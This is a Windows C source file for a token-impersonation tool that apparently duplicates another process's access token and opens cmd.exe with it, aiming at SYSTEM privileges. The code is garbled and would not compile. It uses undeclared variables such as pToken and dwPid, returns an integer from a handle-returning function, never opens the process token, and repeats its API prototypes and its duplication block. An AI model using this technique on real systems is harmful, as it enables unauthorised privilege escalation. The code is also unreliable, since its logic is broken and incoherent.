#include <windows.h>
#include <tchar.h>

BOOL CreateProcessWithTokenW(
  HANDLE                hToken,
  DWORD                 dwLogonFlags,
  LPCWSTR               lpApplicationName,
  LPWSTR                lpCommandLine,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCWSTR               lpCurrentDirectory,
  LPSTARTUPINFOW        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

BOOL DuplicateTokenEx(
  HANDLE                       hExistingToken,
  DWORD                        dwDesiredAccess,
  LPSECURITY_ATTRIBUTES        lpTokenAttributes,
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
  TOKEN_TYPE                   TokenType,
  PHANDLE                      phNewToken
);

BOOL CreateProcessWithTokenW(
  HANDLE                hToken,
  DWORD                 dwLogonFlags,
  LPCWSTR               lpApplicationName,
  LPWSTR                lpCommandLine,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCWSTR               lpCurrentDirectory,
  LPSTARTUPINFOW        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);


HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

HANDLE GetAccessToken(DWORD pid)
{
	
	/* Retrieves an access token for a process */
	HANDLE currentProcess = {};
	HANDLE AccessToken = {};
	DWORD LastError;

	if (pid == 0)
	{
		currentProcess = GetCurrentProcess();
	}
	else
	{
		currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
		if (!currentProcess)
		{
			LastError = GetLastError();
			wprintf(L"ERROR: OpenProcess(): %d\n", LastError);
			return (HANDLE)NULL;
		}
	}
	if(!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken))
	{
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return 1;
	}
	wprintf(L"Process token has been duplicated.\n");

	/* Starts a new process with SYSTEM token */
	STARTUPINFO si = {};
	PROCESS_INFORMATION pi = {};
	BOOL ret;
	ret = CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (!ret)
	{
		DWORD lastError;
		lastError = GetLastError();
		wprintf(L"CreateProcessWithTokenW: %d\n", lastError);
		return 1;
	}
}

int wmain(int argc, WCHAR **argv){
	DWORD LastError;

	/* Argument Check */
	if (argc < 2)
	{
		wprintf(L"Usage: %ls <PID>\n", argv[0]);
		return 1;
	}

	/* Process ID definition */
	DWORD pid;
	pid = _wtoi(argv[1]);
	if ((pid == NULL) || (pid == 0)) return 1;

	wprintf(L"[+] Pid Chosen: %d\n", pid);

        // Retrieves the remote process token.
	HANDLE pToken = GetAccessToken(dwPid);
	
	//These are required to call DuplicateTokenEx.
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = new HANDLE;
	if(!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken))
	{
		DWORD LastError = GetLastError();
		wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return 1;
	}
	wprintf(L"Process token has been duplicated.\n");
}
